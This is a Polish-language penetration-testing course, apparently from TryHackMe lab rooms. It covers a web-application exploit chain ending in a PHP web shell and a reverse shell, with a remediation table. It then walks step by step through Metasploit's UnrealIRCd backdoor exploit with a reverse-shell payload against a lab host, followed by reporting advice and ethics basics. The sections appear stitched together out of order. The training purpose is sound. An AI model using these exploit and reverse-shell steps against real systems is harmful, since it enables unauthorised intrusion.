---

Cofnijmy się o krok i przyjrzyjmy się całej ścieżce, którą przebyliśmy. W raporcie z testu penetracyjnego należy udokumentować cały łańcuch podatności, pokazując klientowi, jak każda słabość przyczyniła się do ogólnego naruszenia bezpieczeństwa. Oto nasz łańcuch:

1. **Wyliczenie** : Odkryliśmy stos technologiczny aplikacji (Apacz,PHP, MySQL), jego struktura katalogów,APIpunkt końcowy, strona resetowania hasła, katalog przesyłania i panel administracyjny.
2. **IDOR(Zadanie 3)** :  `/profile.php?id=`Parametr i punkt `/api/user?id=`końcowy umożliwiają nam wyszczególnienie wszystkich użytkowników, łącznie z imieniem i nazwiskiem administratora oraz jego adresem e-mail.
3. **Resetowanie słabego hasła (zadanie 4)** : Mechanizm resetowania wyświetlał tokeny bezpośrednio w odpowiedzi HTTP, co pozwoliło nam wygenerować token dla administratora i zmienić jego hasło.
4. **Dostęp do panelu administracyjnego (zadanie 5)** : Korzystając ze zhakowanego konta administratora, uzyskaliśmy dostęp do panelu administracyjnego i znaleźliśmy funkcję przesyłania plików z niekompletną listą blokowanych rozszerzeń.
5. **Zdalne wykonanie kodu (zadanie 6)** : Wgraliśmy powłokę webową PHP za pomocą `.phtml`rozszerzenia, które ominęło filtr. Umożliwiło nam to wykonanie polecenia na serwerze i ścieżkę do pełnej powłoki odwrotnej.

Żadna pojedyncza luka w tym łańcuchu nie doprowadziła do całkowitego naruszenia bezpieczeństwa serwera. IDOR Wyciekły dane użytkownika, ale nie zapewniły bezpośredniego dostępu. Resetowanie hasła było podatne na ataki, ale przydatne tylko dlatego, że znaliśmy już adres e-mail administratora. Filtr przesyłania danych miał mechanizm obejścia, ale do jego uzyskania potrzebne były dane logowania administratora. To właśnie połączenie tych słabości doprowadziło do całkowitego przejęcia kontroli nad serwerem.

## Podsumowanie działań naprawczych

Gdybyś pisał raport na potrzeby tego zlecenia, oto zalecenia dotyczące działań naprawczych, które byś przedstawił dla każdego ustalenia:

| Wrażliwość                                       | Powaga    | Remediacja                                                                                                                                                                                                                            |
| ------------------------------------------------ | --------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| IDOR na profilach użytkowników i API             | Wysoki    | Wdrażaj kontrole autoryzacji po stronie serwera dla każdego żądania. Sprawdź, czy uwierzytelniony użytkownik ma uprawnienia dostępu do żądanego zasobu.                                                                               |
| Token resetowania hasła ujawniony w odpowiedzi   | Krytyczny | Wysyłaj tokeny resetujące wyłącznie e-mailem. Wyświetlaj na stronie tylko ogólny komunikat potwierdzający. Używaj kryptograficznie losowych tokenów o długości co najmniej 32 znaków.                                                 |
| Niekompletna lista blokowanych rozszerzeń plików | Krytyczny | Użyj listy dozwolonych, a nie listy blokowanych. Zezwalaj tylko na określone, oczekiwane rozszerzenia. Sprawdź poprawność zawartości pliku (MIM(typ) oprócz rozszerzenia. Przechowuj przesłane pliki poza katalogiem głównym witryny. |
| APIujawnienie punktu końcowego                   | Średni    | UsuńAPIpunkt końcowy indeksu lub ogranicz go do uwierzytelnionych administratorów. Nie udostępniaj wewnętrznych struktur tras nieuwierzytelnionym użytkownikom.                                                                       |

Odpowiedz na poniższe pytania

Ile różnych luk zostało powiązanych ze sobą w tym zaangażowaniu?
W tym pomieszczeniu przeprowadziliśmy kompletny test penetracyjny aplikacji internetowych, od początkowego Nmap skanowanie w celu zdalnego wykonania kodu na serwerze bazowym. Po drodze ćwiczyłeś sposób myślenia, który odróżnia dobrego testera penetracyjnego od świetnego: cierpliwość, obserwację i umiejętność łączenia ustaleń w różnych częściach aplikacji.

Podsumujmy najważniejsze wnioski z tego spotkania:

- **Wyliczenie to podstawa.** Luki, które wykorzystaliśmy, były możliwe do odkrycia, ponieważ poświęciliśmy czas na zmapowanie struktury, nagłówków, punktów końcowych i zachowania aplikacji przed podjęciem próby ich wykorzystania.
- **Drobne wady przeradzają się w duże kompromisy.** Żaden pojedynczy problem nie był tu egzotyczny ani szczególnie złożony. IDOR Słabe resetowanie haseł i omijanie przesyłania danych to dobrze znane luki w zabezpieczeniach. Ich wpływ wynikał ze sposobu, w jaki były ze sobą powiązane.
- **Ograniczenia po stronie klienta nie są zabezpieczeniami.** Formularz przesyłania plików używał `accept`atrybutu ograniczającego typy plików w przeglądarce. Kontrola po stronie serwera korzystała z listy blokowanych, która pomijała alternatywy.PHProzszerzenia. Prawdziwe bezpieczeństwo wymaga walidacji po stronie serwera z wykorzystaniem listy dozwolonych.
- **Mechanizmy resetowania hasła zasługują na szczególną uwagę.** Ich bezpieczne wdrożenie jest skomplikowane, a pojedyncza wada projektowa, taka jak ujawnienie tokena w odpowiedzi, może doprowadzić do przejęcia konta.
- **Myśl jak atakujący, zgłaszaj jak konsultant.** Znalezienie luk w zabezpieczeniach to połowa sukcesu. Ich jasne udokumentowanie, wraz z oceną ważności i praktycznymi wskazówkami dotyczącymi ich usunięcia, sprawia, że ​​współpraca z klientem jest dla niego cenna.

Ukończyłeś test penetracyjny z przewodnikiem. Czas zastosować zdobytą wiedzę w nadchodzących wyzwaniach.

# Test penetracyjny z przewodnikiem: Infrastruktura

## ![Wyliczenie](https://tryhackme-images.s3.amazonaws.com/user-uploads/6989b1062386d3517f652edd/room-content/6989b1062386d3517f652edd-1777546470035.png)

## Dlaczego wyliczać?

Zanim dotkniesz choćby jednego exploita lub spróbujesz złamać jedno hasło, musisz zrozumieć, co widzisz. Enumeracja stanowi podstawę każdego testu penetracyjnego i bez niej jedynie zgadujesz. Cel jest prosty: dowiedzieć się jak najwięcej o celu, zanim podejmiesz jakiekolwiek kroki. Które porty są otwarte? Jakie usługi działają? Jakie wersje za nimi stoją? Każda informacja, którą teraz zbierzesz, wpływa na decyzje, które podejmiesz później. Pośpieszne enumerowanie prowadzi do przegapionych okazji, a w rzeczywistym starciu może to oznaczać różnicę między odkryciem a przypisem w raporcie.

## Skanowanie za pomocą Nmap

Przeskanujmy cel za pomocą Nmap! Używałeś go już wcześniej, ale teraz robisz to celowo. W swoim AttackBoxie otwórz terminal i uruchom następujące polecenie:

`nmap -sV -sC -oN scan.txt 10.128.140.236`

Przypominamy:

- `-sV`Sondy otwierają porty w celu zidentyfikowania usługi i wersji działającej za nią.
- `-sC`uruchamia domyślny zestaw skryptów Nmap, które pobierają dodatkowe szczegóły, takie jak banery, obsługiwane metody uwierzytelniania i inne.
- `-oN scan.txt`zapisuje dane wyjściowe do pliku. Wyrób sobie ten nawyk jak najszybciej, a podziękujesz sobie podczas raportowania.

Po zakończeniu skanowania można przejrzeć wyniki.

**Uwaga: adresy IP, numery portów i wersje usług podane w przykładach tego scenariusza mogą różnić się od tych, które zbierzesz. Dzięki temu, postępując zgodnie z przedstawionymi krokami, możesz osiągnąć rzeczywiste rezultaty.**

Maszyna atakująca

```shell-session
root@ip-10-80-79-108:~# nmap -sV -sC -oN scan.txt 10.128.140.236
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-13 11:55 UTC
Nmap scan report for ip-10-80-143-186.eu-west-1.compute.internal (10.80.143.186)
Host is up (0.00041s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 22:e4:61:bd:b9:9e:3b:0c:c2:96:b1:48:2b:0b:c4:4b (ECDSA)
|_  256 9a:d3:c7:4e:1e:dc:97:55:93:3a:2f:12:5f:1a:9b:8d (ED25519)
8889/tcp open  irc     UnrealIRCd
| irc-info: 
|   users: 1
|   servers: 1
|   lusers: 1
|   lservers: 0
|   server: irc.pentest-target.thm
|   version: Unreal5.1.6.1. irc.pentest-target.thm 
|   uptime: 0 days, 0:01:46
|   source ident: nmap
|   source host: ip-10-80-79-108.eu-west-1.compute.internal
|_  error: Closing Link: keedrluoh[ip-10-80-79-108.eu-west-1.compute.internal] (Quit: keedrluoh)
Service Info: Host: irc.pentest-target.thm; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## ![Analiza podatności](https://tryhackme-images.s3.amazonaws.com/user-uploads/6989b1062386d3517f652edd/room-content/6989b1062386d3517f652edd-1778497462926.png)

## Połącz kropki

Masz już wyniki skanowania. Co teraz?

Nie traktuj wyników jak ściany tekstu. Zacznij zadawać pytania. Czy ta wersja usługi jest przestarzała? Czy istnieje znany exploit? Czy coś jest źle skonfigurowane? Analiza podatności to po prostu proces polegający na wzięciu pod uwagę wyników wyliczenia i zadaniu sobie pytania: „Co tu może pójść nie tak?”.

Twój Nmap Wynik pokazał dwa otwarte porty. Najprostszą metodą jest wyszukanie w Google ich wersji i wpisanie słowa kluczowego „exploit”.

Na przykład, wyszukiwanie w Google hasła „OpenSSH 9.6p1 exploit” może przynieść wyniki teoretyczne lub dotyczące konkretnych exploitów, ale nie konkretne. Zatem najprawdopodobniej jest to ślepa uliczka.

Jeśli pakiety Kali nie sprawiają Ci problemu, zamiast szukać w Google, możesz użyć narzędzia Searchsploit do wyszukiwania exploitów. Searchsploit to narzędzie wiersza poleceń, które pozwala przeszukiwać bazę danych Exploit-DB w trybie offline, zawierającą publiczne exploity i ujawnione luki w zabezpieczeniach, bezpośrednio z poziomu terminala.

`searchsploit openssh`

Maszyna atakująca

```shell-session
root@ip-10-80-79-108:~# searchsploit openssh 
---------------------------------------------------------------------------- --------------------------------- Exploit Title                                                              |  Path---------------------------------------------------------------------------- ---------------------------------Debian OpenSSH - (Authenticated) Remote SELinux Privilege Escalation        | linux/remote/6094.txtDropbear / OpenSSH Server - 'MAX_UNAUTH_CLIENTS' Denial of Service          | multiple/dos/1572.plFreeBSD OpenSSH 3.5p1 - Remote Command Execution                            | freebsd/remote/17462.txtglibc-2.2 / openssh-2.3.0p1 / glibc 2.1.9x - File Read                      | linux/local/258.shNovell Netware 6.5 - OpenSSH Remote Stack Overflow                          | novell/dos/14866.txtOpenSSH 1.2 - '.scp' File Create/Overwrite                                  | linux/remote/20253.shOpenSSH 2.3 < 7.7 - Username Enumeration                                    | linux/remote/45233.pyOpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                              | linux/remote/45210.pyOpenSSH 2.x/3.0.1/3.0.2 - Channel Code Off-by-One                           | unix/remote/21314.txtOpenSSH 2.x/3.x - Kerberos 4 TGT/AFS Token Buffer Overflow                  | linux/remote/21402.txtOpenSSH 3.x - Challenge-Response Buffer Overflow (1)                        | unix/remote/21578.txtOpenSSH 3.x - Challenge-Response Buffer Overflow (2)                        | unix/remote/21579.txtOpenSSH 4.3 p1 - Duplicated Block Remote Denial of Service                  | multiple/dos/2444.shOpenSSH 6.8 < 6.9 - 'PTY' Local Privilege Escalation                        | linux/local/41173.cOpenSSH 7.2 - Denial of Service                                             | linux/dos/40888.pyOpenSSH 7.2p1 - (Authenticated) xauth Command Injection                     | multiple/remote/39569.pyOpenSSH 7.2p2 - Username Enumeration                                        | linux/remote/40136.pyOpenSSH < 6.6 SFTP (x64) - Command Execution                                | linux_x86-64/remote/45000.cOpenSSH < 6.6 SFTP - Command Execution                                      | linux/remote/45001.pyOpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Soc | linux/local/40962.txtOpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                    | linux/remote/40963.txtOpenSSH < 7.7 - User Enumeration (2)                                        | linux/remote/45939.pyOpenSSH SCP Client - Write Arbitrary Files                                  | multiple/remote/46516.pyOpenSSH/PAM 3.6.1p1 - 'gossh.sh' Remote Users Ident                         | linux/remote/26.shOpenSSH/PAM 3.6.1p1 - Remote Users Discovery Tool                           | linux/remote/25.cOpenSSHd 7.2p2 - Username Enumeration                                       | linux/remote/40113.txtPortable OpenSSH 3.6.1p-PAM/4.1-SuSE - Timing Attack                        | multiple/remote/3303.sh---------------------------------------------------------------------------- ---------------------------------
```

Ponownie, nic interesującego, ponieważ wersje różnią się od podanej przez nas wersji. Jednak wyszukiwanie za pomocą którejkolwiek z tych metod w celu uzyskania innego wyniku z Twojej stronynmapskanowanie szybko da rezultaty.

## ![Dostęp początkowy](https://tryhackme-images.s3.amazonaws.com/user-uploads/6989b1062386d3517f652edd/room-content/6989b1062386d3517f652edd-1777546574427.png)

## Zdobywanie przyczółka

Do tej pory powinieneś już znaleźć exploita dla UnrealIRCd, który wykorzystuje furtkę pozostawioną w oprogramowaniu. Jeśli go nie znalazłeś, nie martw się, to dopiero nauka. 

Dobrą stroną exploita, którego zamierzamy użyć, jest to, że istnieje Metasploit Moduł do tego. To sprawia, że ​​eksploatacja jest znacznie łatwiejsza niż modyfikowanie skryptów exploitów. Odpalmy Metasploit Pierwszy.

`msfconsole`

Następnie wyszukaj potrzebny nam moduł.

`search unrealircd`

Maszyna atakująca

```shell-session
msf > search unrealircd

Matching Modules
================

   #  Name                                        Disclosure Date  Rank       Check  Description
   -  ----                                        ---------------  ----       -----  -----------
   0  exploit/unix/irc/unreal_ircd_5161_backdoor  2010-06-12       excellent  No     UnrealIRCD 5.1.6.1 Backdoor Command Execution
```

Korzystając z tej listy, możemy wykorzystać sugerowany exploit przeciwko naszemu celowi.

`use 0`

Najpierw musimy ustalić, co musimy skonfigurować, aby ten exploit mógł zostać uruchomiony.

`show options`

Maszyna atakująca

```shell-session
 msf exploit(unix/irc/unreal_ircd_5161_backdoor) > show options     Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client addres
                                       s
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format
                                        type:host:port[,type:h
                                       ost:port][...]. Support
                                       ed proxies: sapni, sock
                                       s4, socks5, http, socks
                                       5h
   RHOSTS                    yes       The target host(s), see
                                        https://docs.metasploi
                                       t.com/docs/using-metasp
                                       loit/basics/using-metas
                                       ploit.html
   RPORT    8889             yes       The target port (TCP)
```

Jak widać, jedynym wymaganym parametrem, który nie został jeszcze ustawiony, jest parametr `RHOSTS`(oznaczony kolumną **Wymagane** ), więc możemy ustawić go na adres IP maszyny docelowej.

`set RHOSTS 10.128.140.236`

Nadal potrzebujemy ładunku, aby uruchomić ten exploit. Możemy wyświetlić listę dostępnych ładunków za pomocą `show payloads`.

Przykładowy terminal

```shell-session
msf exploit(unix/irc/unreal_ircd_5161_backdoor) > show payloads

Compatible Payloads
===================

   #   Name                                        Disclosure Date  Rank    Check  Description
   -   ----                                        ---------------  ----    -----  -----------
   0   payload/cmd/unix/adduser                    .                normal  No     Add user with useradd
   1   payload/cmd/unix/bind_perl                  .                normal  No     Unix Command Shell, Bind TCP (via Perl)
   2   payload/cmd/unix/bind_perl_ipv6             .                normal  No     Unix Command Shell, Bind TCP (via perl) IPv6
   3   payload/cmd/unix/bind_ruby                  .                normal  No     Unix Command Shell, Bind TCP (via Ruby)
   4   payload/cmd/unix/bind_ruby_ipv6             .                normal  No     Unix Command Shell, Bind TCP (via Ruby) IPv6
   5   payload/cmd/unix/generic                    .                normal  No     Unix Command, Generic Command Execution
   6   payload/cmd/unix/reverse                    .                normal  No     Unix Command Shell, Double Reverse TCP (telnet)
   7   payload/cmd/unix/reverse_bash_telnet_ssl    .                normal  No     Unix Command Shell, Reverse TCP SSL (telnet)
   8   payload/cmd/unix/reverse_perl               .                normal  No     Unix Command Shell, Reverse TCP (via Perl)
   9   payload/cmd/unix/reverse_perl_ssl           .                normal  No     Unix Command Shell, Reverse TCP SSL (via perl)
   10  payload/cmd/unix/reverse_ruby               .                normal  No     Unix Command Shell, Reverse TCP (via Ruby)
   11  payload/cmd/unix/reverse_ruby_ssl           .                normal  No     Unix Command Shell, Reverse TCP SSL (via Ruby)
   12  payload/cmd/unix/reverse_ssl_double_telnet  .                normal  No     Unix Command Shell, Double Reverse TCP SSL (telnet)
```

Ponieważ niewiele wiemy o naszym celu ani o oprogramowaniu, które zainstalował, najbezpieczniejszym rozwiązaniem jest użycie uniwersalnego, odwrotnego ładunku Unix.

`set payload cmd/unix/reverse`

Teraz, jeśli uruchomimy `show options`ponownie, zobaczymy, że LHOST i LPORT są wymagane dla tego ładunku.

`set LHOST 10.128.72.19`  
`set LPORT 443`

Teraz, gdy wszystko jest już gotowe, możemy rozpocząć atak na maszynę docelową za pomocą  `exploit`polecenia.

Maszyna atakująca

```shell-session
msf exploit(unix/irc/unreal_ircd_5161_backdoor) > exploit
[*] Started reverse TCP double handler on 10.82.115.225:443 
[*] 10.82.184.186:8889 - Connected to 10.82.184.186:8889...
    :irc.pentest-target.thm NOTICE AUTH :*** Looking up your hostname...
[*] 10.82.184.186:8889 - Sending backdoor command...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo IpKbSZnM96KvbLgV;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "IpKbSZnM96KvbLgV\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (10.82.115.225:443 -> 10.82.184.186:53836) at 2026-03-17 07:11:47 +0000

whoami
webmaster
```

Po zakończeniu exploita możesz odczytać flagę z `/home/webmaster/flag.txt`.

**Uwaga:** Kiedy po raz pierwszy korzystasz z powłoki odwróconej, zazwyczaj jest to „głupia” powłoka bez pełnych funkcji terminala — brakuje jej kontroli nad zadaniami, uzupełniania klawiszem Tab, a co ważne, polecenia takie jak „ `su`lub” `sudo`nie będą działać, ponieważ wymagają interaktywnego terminala TTY do bezpiecznego odczytu haseł. Aktualizacja do pełnej powłoki TTY przekształca podstawową powłokę odwróconą w pełnoprawną sesję terminala interaktywnego, co jest konieczne, ponieważ polecenia takie jak „ `su`i” `sudo`wymagają prawdziwego terminala (TTY) aby bezpiecznie wyświetlać monit o podanie hasła i je odczytywać. W tym pomieszczeniu nie jest to wymagane, jak zobaczymy później.

Mimo że do spraw sprawozdawczości wrócimy w następnym pomieszczeniu, pewne rzeczy nadal muszą zostać wspomniane.

Przede wszystkim pamiętaj, że klient zobaczy tylko Twój raport. Możesz mieć najlepszy w życiu test penetracyjny, w którym będziesz właścicielem wszystkich bankomatów w banku i zostaniesz administratorem jego domeny, ale jeśli Twój raport jest zły, oznacza to, że test penetracyjny był zły.

Po drugie, chociaż każdy profesjonalista ma swój własny sposób pisania raportów, zawsze powinny się w nich znaleźć pewne ogólne elementy:

- Strona tytułowa z tytułem, Twoim imieniem i nazwiskiem, adresem e-mail i kontrolą wersji.
- Spis treści (opcjonalnie).
- Streszczenie przeznaczone dla kierownika, który zlecił wykonanie zlecenia, wyjaśniające w języku nietechnicznym, co zostało osiągnięte.
- Podsumowanie techniczne przeznaczone dla kierownika ds. inżynierii, aby mógł on zrozumieć wpływ działań i ustalić odpowiednie priorytety (opcjonalnie).
- Tabela zawierająca wszystkie znalezione luki w zabezpieczeniach, uporządkowana według stopnia ich ważności, przeznaczona dla menedżerów i inżynierów, aby umożliwić im odpowiednie ustalenie priorytetów.
- Szczegółowa sekcja dotycząca eksploatacji, w której wyjaśniono każdą lukę i jej wpływ, przedstawiono kroki i dowody wykorzystania, a także zalecenia dotyczące środków zaradczych. Jest to przeznaczone dla inżynierów, którzy usuną Twoje odkrycia.

Na koniec, bądź dumny z tego, co zrobiłeś. Raport to Twoja szansa, by zabłysnąć i pokazać klientowi swoje najlepsze prace. Nie pomijaj żadnych kroków i opisz wszystko tak szczegółowo, jak to możliwe, aby zapewnić klientowi najwyższą wartość.

Poniższy przykład przedstawia zgłoszone ustalenie dotyczące wektora eskalacji uprawnień, jaki wykryliśmy w tym scenariuszu.

**Tytuł:** Hasło roota zapisane w postaci zwykłego tekstu

**Stopień zagrożenia:** krytyczny

**Opis:** Hasło użytkownika root zostało znalezione w pliku w postaci zwykłego tekstu `/etc/password.txt`. Plik ten był czytelny dla użytkowników o niskich uprawnieniach, co umożliwiało każdemu użytkownikowi z dostępem do powłoki uzyskanie danych uwierzytelniających użytkownika root i pełne przejęcie kontroli nad systemem.

**Kroki eksploatacji:**

1. Uzyskaj powłokę o niskich uprawnieniach na systemie docelowym.
2. Przeczytaj zawartość `/etc/password.txt`using `cat /etc/password.txt`.
3. Użyj odkrytego hasła roota, aby zwiększyć uprawnienia za pomocą `ssh root@IP`.

**Zalecenie:** Natychmiast usuń plik z hasłem w postaci zwykłego tekstu i zmień hasło roota. Dane uwierzytelniające nigdy nie powinny być przechowywane w systemie plików w postaci zwykłego tekstu. Wdróż rozwiązanie do zarządzania sekretami lub użyj odpowiednio skonfigurowanych mechanizmów uwierzytelniania systemu (np. `/etc/shadow`z silnym haszowaniem). Dodatkowo, egzekwowaj zasadę najmniejszych uprawnień, aby ograniczyć uprawnienia dostępu do plików.

Testy penetracyjne to proaktywna praktyka bezpieczeństwa, która pomaga organizacjom wykryć słabe punkty w ich systemach, aplikacjach i sieciach, zanim atakujący będą mogli je wykorzystać. Wartość testów penetracyjnych stale rośnie wraz ze wzrostem złożoności współczesnych środowisk. Testerzy rozumiejący podstawy testów penetracyjnych mogą uzyskiwać miarodajne wyniki i skutecznie informować interesariuszy o ryzyku.

W tej sali przedstawiono podstawowe koncepcje, z którymi powinien zapoznać się każdy początkujący tester penetracyjny. Omówiono w niej, czym są testy penetracyjne i czym różnią się od złośliwego hakowania, obszary zainteresowania podczas testów penetracyjnych oraz związek między podatnością, zagrożeniem i ryzykiem. Omówiono również, dlaczego w ogóle istnieją podatności, nastawienie i nawyki kształtujące skutecznych testerów oraz zasady etyczne, które wzmacniają relacje z klientami.

## Cele edukacyjne

- Rozróżnij testy penetracyjne i złośliwe hakowanie na podstawie autoryzacji, zakresu, zasięgu i odpowiedzialności.
- Opisz główne obszary zainteresowania w zakresie testowania penetracyjnego aplikacji internetowych i sieci.
- Zdefiniuj podatność, zagrożenie i ryzyko, a następnie zastosuj tę  `Vulnerability x Threat = Risk` zależność do oceny scenariuszy z życia rzeczywistego.
- Opisz cztery etapy cyklu zarządzania ryzykiem i rozpoznaj, kiedy ryzyko jest łagodzone, akceptowane lub przenoszone.
- Określ najczęstsze przyczyny występowania luk w zabezpieczeniach, w tym ludzkie założenia, błędy oprogramowania, złożoność systemu, nadmierną personalizację oraz wady techniczne lub projektowe.
- Zastosuj sposób myślenia i nawyki skutecznego testera penetracyjnego, takie jak dbałość o szczegóły, myślenie kontekstowe i unikanie nadmiernego polegania na narzędziach lub ograniczania się do jednego celu.
- Podczas realizacji zlecenia postępuj zgodnie z najlepszymi praktykami, w tym sporządzaj dokładne notatki, zbieraj dowody, zarządzaj czasem, komunikuj się proaktywnie i zachowuj profesjonalizm.
- Przestrzegaj zasad etyki, zezwoleń i zaufania przez cały czas trwania współpracy, aby chronić zarówno organizację, jak i testera.

## Wymagania wstępne

W tym pokoju wymagana jest znajomość koncepcji bezpieczeństwa ofensywnego. Jeśli jeszcze tego nie zrobiłeś, przed kontynuacją ukończ poniższy moduł:

- [Wprowadzenie do bezpieczeństwa ofensywnego](https://tryhackme.com/module/introduction-to-offensive-security)

## Czym jest testowanie penetracyjne?

Testy penetracyjne, czyli „pentesting”, to autoryzowana ocena bezpieczeństwa przeprowadzana w systemach, aplikacjach lub sieciach. Przeprowadza się ją za wyraźną zgodą właściciela systemu, w uzgodnionych granicach.

Testy penetracyjne są ważne, ponieważ współczesne systemy są złożone i stale się zmieniają. Czynniki te utrudniają organizacjom identyfikację wszystkich słabych punktów na etapie samego projektowania i rozwoju. Dobrze zbudowane systemy mogą również zawierać słabości, które mogą narazić je na ataki. Testy penetracyjne wypełniają tę lukę i pomagają organizacjom zrozumieć, w jaki sposób te słabości mogą zostać wykorzystane, co pozwala im na priorytetyzację napraw i ograniczenie ryzyka, zanim luki zostaną wykorzystane przez atakujących.

Testy penetracyjne są niezbędną usługą bezpieczeństwa z wielu powodów. Zapewniają one organizacjom możliwość priorytetyzacji działań naprawczych w oparciu o poziom ryzyka związanego z lukami. Pomagają chronić poufność wrażliwych danych klientów, takich jak dane płatnicze czy dane osobowe (Informacje osobowe), co zapewnia zgodność z wieloma ramami regulacyjnymi i standardami branżowymi, takimi jak standard bezpieczeństwa danych branży kart płatniczych ( [PCI-DSS(otwiera się w nowej karcie)](https://www.pcisecuritystandards.org/standards/pci-dss/)) i ogólnego rozporządzenia o ochronie danych ([RODO(otwiera się w nowej karcie)](https://gdpr-info.eu/)). Rzeczywiste scenariusze ataków i ocena ogólnego stanu bezpieczeństwa organizacji gwarantują skuteczność kontroli bezpieczeństwa. Proces ten zapewnia kierownictwu, interesariuszom i klientom pewność, że słabe punkty są proaktywnie eliminowane.

## Testowanie penetracyjne a złośliwe hakowanie

Chociaż testerzy penetracyjni i cyberprzestępcy mogą używać podobnych narzędzi, sposób ich działania jest zupełnie inny. Kluczowe czynniki w poniższej tabeli odróżniają testy penetracyjne od cyberataków:

|Czynnik podstawowy|Tester penetracyjny|Złośliwy napastnik|
|---|---|---|
|Upoważnienie|Testerzy penetracyjni działają na podstawie wyraźnej pisemnej zgody właściciela systemu.|Atakujący działają bez zgody i naruszają prawa oraz bezpieczeństwo organizacji.|
|Zakres|Testerzy penetracyjni działają w ramach jasno zdefiniowanego zakresu ustalonego przez organizację w celu ochrony krytycznych systemów.|Atakujący nie są ograniczeni zakresem ataku i wezmą na cel wszystko, co pomoże im osiągnąć cel.|
|Zasięg|Testerzy penetracyjni dążą do szerokiego pokrycia i oceniają wiele obszarów systemu.|Atakujący koncentrują się na najszybszej lub najskuteczniejszej drodze do sukcesu i często obierają sobie za cel systemy i dane, które mogą przynieść korzyści finansowe.|
|Odpowiedzialność|Testerzy penetracyjni ponoszą odpowiedzialność za swoje działania i wpływ swojej pracy. Oczekuje się od nich, że będą zawsze postępować profesjonalnie.|Napastnicy nie czują się odpowiedzialni za swoje działania i nie biorą odpowiedzialności za szkody, które wyrządzają.|

W teście penetracyjnym, pokrycie jest kluczowe dla pełnej oceny ogólnego stanu bezpieczeństwa organizacji. Aby uzyskać satysfakcjonujący poziom pokrycia, ważne jest zrozumienie różnych obszarów, które analizuje tester penetracyjny. To zadanie obejmie obszary oceniane podczas testów penetracyjnych aplikacji internetowych i sieci.

## Testowanie penetracyjne aplikacji internetowych

Testowanie penetracyjne aplikacji internetowych koncentruje się na wyszukiwaniu luk i słabych punktów w aplikacji internetowej. Testowanie jest zazwyczaj przeprowadzane z perspektywy użytkownika poprzez interakcję z interfejsem użytkownika aplikacji i jej interfejsami API. Celem jest ocena sposobu, w jaki aplikacja obsługuje dane wprowadzane przez użytkownika, uwierzytelnianie, autoryzację, sesje i przetwarzanie danych. Słabe punkty w aplikacjach internetowych mogą mieć duży wpływ na ich użytkowników, ponieważ aplikacje internetowe są zazwyczaj narażone na działanie internetu.

![Diagram ilustrujący testy penetracyjne aplikacji internetowej i jej komponentów](https://tryhackme-images.s3.amazonaws.com/user-uploads/68f9e128ba199589d7ad0335/room-content/68f9e128ba199589d7ad0335-1780435724559.svg)

Powyższy diagram przedstawia prostą interakcję między testerem penetracyjnym a aplikacją internetową i jej komponentami. Podczas testu penetracyjnego aplikacji internetowej aplikacja jest testowana pod kątem słabych punktów w różnych obszarach, takich jak uwierzytelnianie, autoryzacja, zarządzanie sesjami, walidacja danych wejściowych i wyjściowych oraz konfiguracja zabezpieczeń.

- **Uwierzytelnianie** : W tym obszarze oceniane są słabe punkty w obsłudze poświadczeń aplikacji, polityce haseł, mechanizmach blokowania kont i uwierzytelnianiu wieloskładnikowym (MFA) implementację, ochronę przed zautomatyzowanymi atakami, takimi jak ataki siłowe i wypełnianie danych uwierzytelniających, przebieg resetowania hasła i ogólną logikę związaną z uwierzytelnianiem.
- **Autoryzacja** : Ten obszar jest oceniany pod kątem słabych punktów w mechanizmie kontroli dostępu do aplikacji, zapewniając, że użytkownicy mogą uzyskiwać dostęp wyłącznie do zasobów i wykonywać działania dozwolone zgodnie z ich rolą, a także chroniąc przed atakami polegającymi na pionowej i poziomej eskalacji uprawnień.
- **Zarządzanie sesjami** : Ten obszar jest oceniany pod kątem słabych punktów w sposobie tworzenia, utrzymywania i unieważniania sesji. Obejmuje to ryzyko utrwalenia sesji, unieważniania sesji po wylogowaniu, egzekwowania limitu czasu bezczynności, bezpiecznych atrybutów plików cookie oraz ochrony przed fałszowaniem żądań między witrynami (CSRF).
- **Walidacja danych wejściowych i wyjściowych** : W tym obszarze ocenia się słabe punkty w kontrolach przetwarzania danych w aplikacji, w tym ochronę przed atakami typu injection, walidację typów danych i obsługę danych wyjściowych.
- **Konfiguracja zabezpieczeń** : Ten obszar jest oceniany pod kątem luk w konfiguracjach serwera i aplikacji, w tym nagłówków zabezpieczeń, sposobu obsługi błędów, kontroli ograniczających przepustowość, konfiguracji kryptograficznej i narażenia niepotrzebnych usług lub funkcji.

## Testowanie penetracji sieci

Testy penetracyjne sieci koncentrują się na wyszukiwaniu luk w zabezpieczeniach infrastruktury bazowej łączącej systemy. Testowanie może być przeprowadzane z perspektywy użytkownika zewnętrznego lub wewnętrznego.

Testy penetracji sieci zewnętrznych przeprowadzane są z perspektywy użytkownika zewnętrznego, z ograniczonym lub zerowym dostępem do informacji o systemach narażonych na działanie czynników zewnętrznych. Ten rodzaj oceny koncentruje się na infrastrukturze zewnętrznej, takiej jak serwery z dostępem do internetu, zapory sieciowe,VPNBramy i usługi dostępu zdalnego. Celem jest ocena stopnia narażenia tych systemów na ataki oraz ocena mechanizmów bezpieczeństwa chroniących je przed nieautoryzowanymi użytkownikami.

Z drugiej strony, testy penetracyjne sieci wewnętrznej to scenariusz „założonego naruszenia”, w którym atakujący ma już dostęp do systemu w sieci. Ten rodzaj oceny ocenia, co atakujący może zrobić dalej, na przykład przemieszczać się między systemami, eskalować uprawnienia lub uzyskać dostęp do poufnych danych. Celem jest ocena relacji zaufania, kontroli dostępu i sieci.segmentacjaaby zidentyfikować słabe konfiguracje i ustalić, czy kontrole bezpieczeństwa mogą ograniczyć skutki naruszenia bezpieczeństwa.

